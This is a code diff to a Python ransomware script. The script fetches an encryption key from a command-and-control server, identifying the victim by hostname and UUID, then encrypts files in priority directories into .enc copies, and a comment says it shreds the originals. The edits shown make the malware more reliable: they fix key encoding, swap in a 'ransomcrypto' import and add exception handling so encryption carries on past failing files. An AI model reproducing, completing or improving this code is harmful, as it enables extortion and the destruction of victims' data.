@@ -1,4 +1,5 @@
 # get a KEY from the C&C server
+
 import requests, uuid, os
 UUID = uuid.uuid4()
 host_name = os.environ['COMPUTERNAME']
@@ -12,11 +13,11 @@ while encryption_key == "":
     r = requests.get(url, params=payload)
 
     if r.status_code == 200:
-        encryption_key = r.text.split("<")[0].strip()
+        encryption_key = r.text.split("<")[0].strip().encode('utf8')
     else:
         pass
 
-import crypto
+from ransomcrypto import *
 
 excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
 
@@ -37,8 +38,11 @@ for target in priority_dirs:
 
                 # create new encrypted file with .enc extension
 
-                with open(file_name_loc, 'rb+') as in_file, open(file_name_loc+".enc", 'wb+') as out_file:
-                    encrypt(in_file, out_file, encryption_key)
+                try:
+                    with open(file_name_loc, 'rb+') as in_file, open(file_name_loc+".enc", 'wb+') as out_file:
+                        encrypt(in_file, out_file, encryption_key)
+                except:
+                    continue
 
                 # shred the orginial file
 
